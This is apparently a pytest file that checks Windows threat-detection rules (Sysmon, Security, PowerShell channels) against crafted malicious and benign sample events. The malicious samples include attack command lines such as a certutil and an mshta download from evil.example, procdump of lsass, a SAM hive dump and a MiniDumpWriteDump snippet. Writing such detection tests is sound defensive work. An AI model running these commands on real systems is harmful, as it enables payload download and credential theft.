"""Day 10 verification (Pair 1): "test each rule against crafted sample
events" -- the full fire/no-fire matrix for all rules in
detection/rules/, end to end through rule_loader.load_rules() +
engine.evaluate_event(). Filename matches the roadmap's Day 10 Files
column exactly. Extended Day 12 with 5 more cases (lateral movement /
credential access rules, 10 -> 15 total), and again with 11 more cases
covering the expanded Sysmon event-ID coverage (15 -> 26 total).
"""

from datetime import datetime, timezone

import pytest

from app.detection import rule_loader
from app.detection.engine import evaluate_event
from app.schemas.event import NormalizedEvent

# (rule_title, event_id, matching event_data, benign look-alike event_data)
RULE_CASES = [
    (
        "Suspicious Encoded PowerShell Command",
        1,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command Get-Process"},
    ),
    (
        "Certutil Download via urlcache/split Flags",
        1,
        {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://evil.example/a.exe out.exe"},
        {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -verify cert.pem"},
    ),
    (
        "PowerShell Execution Policy Bypass",
        1,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File payload.ps1"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command Get-Process"},
    ),
    (
        "Suspicious Network Connection from LOLBin",
        3,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "203.0.113.10", "DestinationPort": "443"},
        {"Image": "C:\\Windows\\System32\\svchost.exe", "DestinationIp": "239.255.255.250", "DestinationPort": "1900"},
    ),
    (
        "Suspicious Executable Written to Public or Temp Directory",
        11,
        {"TargetFilename": "C:\\Users\\Public\\update.exe"},
        {"TargetFilename": "C:\\Users\\alice\\Documents\\report.docx"},
    ),
    (
        "Registry Run Key Persistence",
        13,
        {"TargetObject": "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "Details": "C:\\Users\\Public\\update.exe"},
        {"TargetObject": "HKU\\S-1-5-21\\Software\\SomeVendor\\App\\Settings", "Details": "1"},
    ),
    (
        "Registry IFEO Debugger Hijack",
        13,
        {"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger", "Details": "C:\\Windows\\System32\\cmd.exe"},
        {"TargetObject": "HKU\\S-1-5-21\\Software\\SomeVendor\\App\\Settings", "Details": "1"},
    ),
    (
        "Scheduled Task Creation via schtasks.exe",
        1,
        {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /tn Updater /tr payload.exe /sc onlogon"},
        {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /query /tn Updater"},
    ),
    (
        "Suspicious Scheduled Task via PowerShell Cmdlet",
        1,
        {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe Register-ScheduledTask -TaskName Updater -Action $action"},
        {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe Get-ScheduledTask"},
    ),
    (
        "Suspicious Mshta Execution",
        1,
        {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe http://evil.example/payload.hta"},
        {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe"},
    ),
    (
        "LSASS Memory Dump",
        1,
        {"Image": "C:\\Tools\\procdump.exe", "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp"},
        {"Image": "C:\\Tools\\procdump.exe", "CommandLine": "procdump.exe -ma notepad.exe notepad.dmp"},
    ),
    (
        "SAM/SYSTEM/SECURITY Registry Hive Dump",
        1,
        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe save hklm\\sam C:\\temp\\sam.hive"},
        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe query hklm\\software\\microsoft"},
    ),
    (
        "RDP Lateral Movement",
        3,
        {"Image": "C:\\Windows\\System32\\mstsc.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "3389"},
        {"Image": "C:\\Windows\\System32\\svchost.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "443"},
    ),
    (
        "Lateral Movement via Windows Admin Share",
        1,
        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\10.0.0.5\\admin$ /user:admin"},
        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\10.0.0.5\\shared /user:admin"},
    ),
    (
        "WinRM Lateral Movement",
        3,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "5985"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "80"},
    ),
    (
        "Suspicious Access to Protected System Process",
        10,
        {"TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x00001010"},
        {"TargetImage": "C:\\Windows\\System32\\notepad.exe", "GrantedAccess": "0x00001010"},
    ),
    (
        "Remote Thread Creation from Scripting Engine or Web Server Process",
        8,
        {"SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetImage": "C:\\Windows\\System32\\notepad.exe"},
        {"SourceImage": "C:\\Program Files\\Antivirus\\avservice.exe", "TargetImage": "C:\\Windows\\System32\\notepad.exe"},
    ),
    (
        "User Account Control Disabled via Registry",
        13,
        {"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\EnableLUA", "Details": "DWORD (0x00000000)"},
        {"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\EnableLUA", "Details": "DWORD (0x00000001)"},
    ),
    (
        "UAC Bypass via sdclt.exe IsolatedCommand Registry Hijack",
        13,
        {"TargetObject": "HKU\\S-1-5-21-1\\exefile\\shell\\runas\\command\\IsolatedCommand", "Details": "C:\\Windows\\System32\\cmd.exe /c payload.exe"},
        {"TargetObject": "HKU\\S-1-5-21-1\\exefile\\shell\\open\\command", "Details": "%1 %*"},
    ),
    (
        "Accessibility Tool Launched by Utilman or Winlogon",
        1,
        {"Image": "C:\\Windows\\System32\\osk.exe", "ParentImage": "C:\\Windows\\System32\\Utilman.exe"},
        {"Image": "C:\\Windows\\System32\\osk.exe", "ParentImage": "C:\\Windows\\explorer.exe"},
    ),
    (
        "Rogue Spoolss Named Pipe (SeImpersonate Privilege Escalation)",
        17,
        {"PipeName": "\\9023de59-e026-4da5-97dd-913597cd038f\\pipe\\spoolss", "Image": "c:\\Users\\IEUser\\Tools\\PrivEsc\\PrintSpoofer.exe"},
        {"PipeName": "\\spoolss", "Image": "C:\\Windows\\System32\\spoolsv.exe"},
    ),
    (
        "WMI CommandLineEventConsumer Persistence",
        20,
        {"EventType": "WmiConsumerEvent", "Type": "Command Line", "Destination": "cmd.exe"},
        {"EventType": "WmiConsumerEvent", "Type": "Log", "Destination": "eventlog"},
    ),
    (
        "File Creation Timestamp Backdated (Timestomping)",
        2,
        {"TargetFilename": "C:\\Users\\Public\\bs.ps1", "TimestompSuspected": "true"},
        {"TargetFilename": "C:\\Users\\Public\\bs.ps1", "TimestompSuspected": "false"},
    ),
    (
        "LOLBin Execution via Program Compatibility Assistant (pcalua.exe)",
        1,
        {"Image": "C:\\Windows\\System32\\pcalua.exe", "CommandLine": "\"C:\\Windows\\System32\\pcalua.exe\"  -a c:\\Windows\\system32\\calc.exe"},
        {"Image": "C:\\Windows\\System32\\pcalua.exe", "CommandLine": "\"C:\\Windows\\System32\\pcalua.exe\" /?"},
    ),
    (
        "Suspicious Child Process of ftp.exe",
        1,
        {"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\ftp.exe"},
        {"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\explorer.exe"},
    ),
    (
        "Process Spawned by WinRM/PSRemoting Host",
        1,
        {"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\wsmprovhost.exe"},
        {"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\explorer.exe"},
    ),
    (
        "Known-Abusable (LOLDriver) Kernel Driver Loaded",
        6,
        {"ImageLoaded": "C:\\Windows\\System32\\drivers\\RwDrv.sys", "Signed": "true", "Signature": "ChongKim Chan"},
        {"ImageLoaded": "C:\\Windows\\System32\\drivers\\ntfs.sys", "Signed": "true", "Signature": "Microsoft Windows"},
    ),
]


# Security-channel rules -- each declares `service: security` in its YAML
# and is scoped to real Security event IDs, not Sysmon ones. Kept as a
# separate list (rather than folded into RULE_CASES) because RULE_CASES'
# _event() helper hardcodes a Sysmon channel string, matching every one of
# the 26 Sysmon-scoped rules above; retrofitting all 26 tuples to carry a
# channel just to add 3 more would be a much larger, noisier diff for the
# same coverage.
# (title, event_id, matching_event_data, benign_event_data_or_None)
SECURITY_RULE_CASES = [
    (
        "Security Audit Log Cleared",
        1102,
        {},
        # No meaningful benign look-alike: the rule's only selection field
        # IS the event_id itself (real 1102 samples carry no EventData at
        # all), and `audit_log_cleared` is scoped to exactly {1102} -- any
        # event that reaches this rule's selection already satisfies it.
        None,
    ),
    (
        "DCSync -- Directory Replication Rights Abused",
        4662,
        {"Properties": "{...} {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {...}"},
        {"Properties": "{...} {00299570-246d-11d0-a768-00aa006e0529} {...}"},
    ),
    (
        "LSASS Handle Access via Security Auditing",
        4663,
        {"ObjectName": "C:\\Windows\\system32\\lsass.exe"},
        {"ObjectName": "C:\\Windows\\System32\\notepad.exe"},
    ),
    (
        "Sensitive Local Group/Account Enumeration via net.exe",
        4799,
        {"CallerProcessName": "C:\\Windows\\System32\\net1.exe", "TargetUserName": "Administrators"},
        # Benign look-alike: same enumerating process, but a non-privileged
        # group -- routine account administration, not discovery targeting
        # a high-value group.
        {"CallerProcessName": "C:\\Windows\\System32\\net1.exe", "TargetUserName": "Marketing"},
    ),
    (
        "RDP Logon via Loopback-Tunneled Connection",
        4624,
        {"LogonType": "10", "IpAddress": "127.0.0.1"},
        # Benign look-alike: a real RDP session, same LogonType, but the
        # real client address rather than loopback.
        {"LogonType": "10", "IpAddress": "10.0.0.7"},
    ),
    (
        "Executable Payload Written to Admin Share (Remote File Copy)",
        5145,
        {
            "ShareName": "\\\\*\\C$",
            "RelativeTargetName": "Windows\\Temp\\setup.bat",
            "AccessList": "%%1537\n%%1538\n%%1539\n%%1541\n%%4416\n%%4417\n%%4418\n%%4419\n%%4420\n%%4423\n%%4424",
        },
        # Benign look-alike: same admin share, same executable-shaped
        # target, but a read-only access grant (no %%4417/WriteData) --
        # e.g. an AV scanner or backup agent listing the file, not writing
        # it. Real content: this exact shape (wodCmdTerm.exe) in the
        # verified sample.
        {
            "ShareName": "\\\\*\\C$",
            "RelativeTargetName": "Windows\\Temp\\wodCmdTerm.exe",
            "AccessList": "%%1538\n%%1541\n%%4416\n%%4419\n%%4423",
        },
    ),
    (
        "Well-Known Low-Privilege Account Added to Local Administrators",
        4732,
        {"TargetSid": "S-1-5-32-544", "MemberSid": "S-1-5-20"},
        # Benign look-alike: same target group (Administrators), but the
        # new member is a real, non-well-known-low-privilege account SID --
        # routine admin-group membership management.
        {"TargetSid": "S-1-5-32-544", "MemberSid": "S-1-5-21-111111111-222222222-3333333333-1105"},
    ),
    (
        "Computer Account Created",
        4720,
        {"SamAccountName": "WORKSTATION01$"},
        # Benign look-alike: a human user account, no trailing "$".
        {"SamAccountName": "jdoe"},
    ),
    (
        "Scheduled Task Created with Hidden Flag",
        4698,
        {"TaskContent": "<Task><Settings><Hidden>true</Hidden></Settings></Task>"},
        {"TaskContent": "<Task><Settings><Hidden>false</Hidden></Settings></Task>"},
    ),
    (
        "Audit Policy Weakened (Success or Failure Auditing Removed)",
        4719,
        {"AuditPolicyChanges": "%%8449, %%8451"},
        # Benign look-alike: same event, but auditing was added, not
        # removed -- routine policy tightening (e.g. a GPO enabling a new
        # audit category), not defense evasion.
        {"AuditPolicyChanges": "%%8448, %%8450"},
    ),
    (
        "Remote Registry Access via winreg Named Pipe",
        5145,
        {"ShareName": "\\\\*\\IPC$", "RelativeTargetName": "winreg"},
        # Benign look-alike: same admin share, a different (and far more
        # common) RPC endpoint -- e.g. querying share enumeration, not
        # touching the registry.
        {"ShareName": "\\\\*\\IPC$", "RelativeTargetName": "srvsvc"},
    ),
    (
        "Kernel-Mode Driver Installed as a Windows Service",
        4697,
        {"ServiceType": "0x00000001"},
        # Benign look-alike: real value from the other 3 real 4697 samples
        # in this project's corpus (ordinary user-mode/own-process
        # services) -- not invented, drawn directly from the RDP-hijack,
        # Meterpreter-stager, and SMBexec fixtures.
        {"ServiceType": "0x00000010"},
    ),
    (
        "Sensitive Domain Group Membership Change",
        4728,
        {"TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-512"},
        # Benign look-alike: real value from the 11-generic-group fixture
        # (Group02, non-sensitive RID) -- not invented.
        {"TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-1135"},
    ),
]

# PowerShell/Operational-channel rules -- each declares `service:
# powershell` in its YAML and is scoped to Event ID 4104 (Script Block
# Logging). Kept separate from SECURITY_RULE_CASES for the same reason
# that list is kept separate from RULE_CASES: _event()'s channel default
# doesn't fit a third channel any better than a second.
# (title, event_id, matching_event_data, benign_event_data_or_None)
POWERSHELL_RULE_CASES = [
    (
        "PowerShell LSASS Memory Dump via Reflection",
        4104,
        {"ScriptBlockText": "$Process = Get-Process lsass; $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump')"},
        # Benign look-alike: mentions lsass (e.g. a monitoring script
        # checking it's running) but never MiniDumpWriteDump.
        {"ScriptBlockText": "Get-Process lsass | Select-Object Id, WorkingSet"},
    ),
    (
        "PowerShell Fake Credential Prompt (Phishing)",
        4104,
        {"ScriptBlockText": "$cred = $Host.ui.PromptForCredential('Windows Security', 'msg', '', ''); $DS.ValidateCredentials($u, $p)"},
        # Benign look-alike: prompts for a credential but never validates
        # it against anything -- a normal "enter your password to
        # continue" script, not a phishing harvester.
        {"ScriptBlockText": "$cred = $Host.ui.PromptForCredential('Enter password', 'msg', '', ''); Connect-Service -Credential $cred"},
    ),
    (
        "Suspicious PowerShell WebClient Instantiation",
        4104,
        {"ScriptBlockText": "$wc = New-Object Net.WebClient; $wc.DownloadFile($url, $out)"},
        {"ScriptBlockText": "Get-Process | Where-Object { $_.CPU -gt 100 }"},
    ),
]


def _event(event_id, event_data, channel="Microsoft-Windows-Sysmon/Operational"):
    # Every rule in RULE_CASES is Sysmon-scoped (`service: sysmon` in its
    # YAML) -- see engine.py's evaluate_event() channel guard -- so a
    # synthetic event needs a real Sysmon channel string to be evaluated at
    # all, matching production data. SECURITY_RULE_CASES passes channel=
    # "Security" explicitly.
    return NormalizedEvent(
        host="WORKSTATION01",
        timestamp=datetime(2026, 8, 19, tzinfo=timezone.utc),
        event_id=event_id,
        channel=channel,
        raw={},
        event_data=event_data,
    )


def test_exactly_forty_three_rules_are_covered_by_this_matrix():
    assert len(RULE_CASES) + len(SECURITY_RULE_CASES) + len(POWERSHELL_RULE_CASES) == 43
    rules = rule_loader.load_rules()
    covered_titles = (
        {title for title, *_ in RULE_CASES}
        | {title for title, *_ in SECURITY_RULE_CASES}
        | {title for title, *_ in POWERSHELL_RULE_CASES}
    )
    assert covered_titles == {r.title for r in rules}


@pytest.mark.parametrize("title,event_id,matching_data,benign_data", RULE_CASES, ids=[c[0] for c in RULE_CASES])
def test_rule_fires_on_matching_event(title, event_id, matching_data, benign_data):
    rules = rule_loader.load_rules()
    event = _event(event_id, matching_data)

    matches = evaluate_event(event, rules)

    assert any(m.title == title for m in matches), f"expected {title!r} to fire, matched: {[m.title for m in matches]}"


@pytest.mark.parametrize("title,event_id,matching_data,benign_data", RULE_CASES, ids=[c[0] for c in RULE_CASES])
def test_rule_does_not_fire_on_benign_look_alike(title, event_id, matching_data, benign_data):
    rules = rule_loader.load_rules()
    event = _event(event_id, benign_data)

    matches = evaluate_event(event, rules)

    assert not any(m.title == title for m in matches), f"expected {title!r} NOT to fire on benign data"


@pytest.mark.parametrize(
    "title,event_id,matching_data,benign_data", SECURITY_RULE_CASES, ids=[c[0] for c in SECURITY_RULE_CASES]
)
def test_security_rule_fires_on_matching_event(title, event_id, matching_data, benign_data):
    rules = rule_loader.load_rules()
    event = _event(event_id, matching_data, channel="Security")

    matches = evaluate_event(event, rules)

    assert any(m.title == title for m in matches), f"expected {title!r} to fire, matched: {[m.title for m in matches]}"


@pytest.mark.parametrize(
    "title,event_id,matching_data,benign_data", SECURITY_RULE_CASES, ids=[c[0] for c in SECURITY_RULE_CASES]
)
def test_security_rule_does_not_fire_on_benign_look_alike(title, event_id, matching_data, benign_data):
    if benign_data is None:
        pytest.skip(f"{title!r} has no meaningful benign look-alike -- see SECURITY_RULE_CASES")
    rules = rule_loader.load_rules()
    event = _event(event_id, benign_data, channel="Security")

    matches = evaluate_event(event, rules)

    assert not any(m.title == title for m in matches), f"expected {title!r} NOT to fire on benign data"


@pytest.mark.parametrize(
    "title,event_id,matching_data,benign_data", POWERSHELL_RULE_CASES, ids=[c[0] for c in POWERSHELL_RULE_CASES]
)
def test_powershell_rule_fires_on_matching_event(title, event_id, matching_data, benign_data):
    rules = rule_loader.load_rules()
    event = _event(event_id, matching_data, channel="Microsoft-Windows-PowerShell/Operational")

    matches = evaluate_event(event, rules)

    assert any(m.title == title for m in matches), f"expected {title!r} to fire, matched: {[m.title for m in matches]}"


@pytest.mark.parametrize(
    "title,event_id,matching_data,benign_data", POWERSHELL_RULE_CASES, ids=[c[0] for c in POWERSHELL_RULE_CASES]
)
def test_powershell_rule_does_not_fire_on_benign_look_alike(title, event_id, matching_data, benign_data):
    rules = rule_loader.load_rules()
    event = _event(event_id, benign_data, channel="Microsoft-Windows-PowerShell/Operational")

    matches = evaluate_event(event, rules)

    assert not any(m.title == title for m in matches), f"expected {title!r} NOT to fire on benign data"


def test_kernel_driver_service_rule_uses_exact_match_not_contains():
    """The rule matches ServiceType by exact equality (no `|contains`
    modifier). Confirm a different, unequal-length-would-not-help-anyway
    hex value that is NOT the kernel-driver ServiceType does not fire --
    e.g. a hypothetical combined/different flag value -- and that the
    match is still case-insensitive (engine.py lowercases both sides
    regardless of modifier), matching real uppercase-hex EVTX exports."""
    rules = rule_loader.load_rules()

    non_matching = _event(4697, {"ServiceType": "0x00000011"}, channel="Security")
    assert not any(
        m.title == "Kernel-Mode Driver Installed as a Windows Service" for m in evaluate_event(non_matching, rules)
    )

    uppercase_match = _event(4697, {"ServiceType": "0X00000001"}, channel="Security")
    assert any(
        m.title == "Kernel-Mode Driver Installed as a Windows Service" for m in evaluate_event(uppercase_match, rules)
    )


def test_sensitive_domain_group_rule_also_fires_on_4756_universal_group_shape():
    """The rule's category (sensitive_domain_group_membership_change)
    covers both 4728 (global group) and 4756 (universal group) -- confirm
    the second event ID, not just the one exercised by
    SECURITY_RULE_CASES, also fires for a sensitive target. Real value:
    Enterprise Admins, RID -519, from
    ID4728-4756-Member added to sensitive domain groups.evtx."""
    rules = rule_loader.load_rules()
    event = _event(
        4756,
        {"TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-519"},
        channel="Security",
    )

    matches = evaluate_event(event, rules)

    assert any(m.title == "Sensitive Domain Group Membership Change" for m in matches)


def test_sensitive_domain_group_rule_rid_suffix_anchors_on_the_delimiter():
    """`endswith` must anchor on the literal '-' RID delimiter, not just
    the trailing digits -- a RID like -1512 must not false-match the -512
    (Domain Admins) selection value just because it ends in the digits
    "512". Confirms this holds by construction rather than by coincidence
    of the current real sample set (none of which contains a RID shaped
    like this)."""
    rules = rule_loader.load_rules()
    event = _event(
        4728,
        {"TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-1512"},
        channel="Security",
    )

    matches = evaluate_event(event, rules)

    assert not any(m.title == "Sensitive Domain Group Membership Change" for m in matches)


def test_sensitive_enumeration_rule_also_fires_on_4798_user_membership_shape():
    """The rule's category (local_group_enumeration) covers both 4799
    (group membership enumerated) and 4798 (a user's group membership
    enumerated) -- confirm the second event ID, not just the one exercised
    by SECURITY_RULE_CASES, also fires for a sensitive target."""
    rules = rule_loader.load_rules()
    event = _event(
        4798,
        {"CallerProcessName": "C:\\Windows\\System32\\net1.exe", "TargetUserName": "Administrator"},
        channel="Security",
    )

    matches = evaluate_event(event, rules)

    assert any(m.title == "Sensitive Local Group/Account Enumeration via net.exe" for m in matches)


def test_sensitive_enumeration_rule_requires_net1_as_the_caller_process():
    """A sensitive TargetUserName alone must not be enough -- the same
    group/account can be enumerated by other legitimate tooling (e.g. an
    AD management console), which this rule intentionally does not cover
    (net.exe/net1.exe is the specific well-precedented discovery pattern)."""
    rules = rule_loader.load_rules()
    event = _event(
        4799,
        {"CallerProcessName": "C:\\Windows\\System32\\dsa.msc", "TargetUserName": "Administrators"},
        channel="Security",
    )

    matches = evaluate_event(event, rules)

    assert not any(m.title == "Sensitive Local Group/Account Enumeration via net.exe" for m in matches)


def test_security_rules_do_not_fire_on_sysmon_channel_event_id_collision():
    """The cross-channel-collision regression: `process_access` maps to
    both Sysmon 10 and Security 4656/4663, and `process_creation` maps to
    both Sysmon 1 and Security 4688. A Sysmon-channel event must never
    trigger a `service: security` rule even if its event_id coincidentally
    matches that rule's category set with fields that would otherwise
    satisfy the selection.
    """
    rules = rule_loader.load_rules()
    # event_id=4663 on the *Sysmon* channel, carrying the exact ObjectName
    # the Security LSASS rule looks for -- must not fire, since that rule
    # is `service: security` and this event's channel is not.
    event = _event(4663, {"ObjectName": "C:\\Windows\\system32\\lsass.exe"}, channel="Microsoft-Windows-Sysmon/Operational")

    matches = evaluate_event(event, rules)

    assert not any(m.title == "LSASS Handle Access via Security Auditing" for m in matches)


def test_sysmon_rules_do_not_fire_on_security_channel_event_id_collision():
    """The mirror image: event_id=10 on the Security channel must never
    trigger the Sysmon-scoped `protected_process_access.yml` rule, even
    with a GrantedAccess value that would satisfy its selection.
    """
    rules = rule_loader.load_rules()
    event = _event(
        10,
        {"TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x00001010"},
        channel="Security",
    )

    matches = evaluate_event(event, rules)

    assert not any(m.title == "Suspicious Access to Protected System Process" for m in matches)
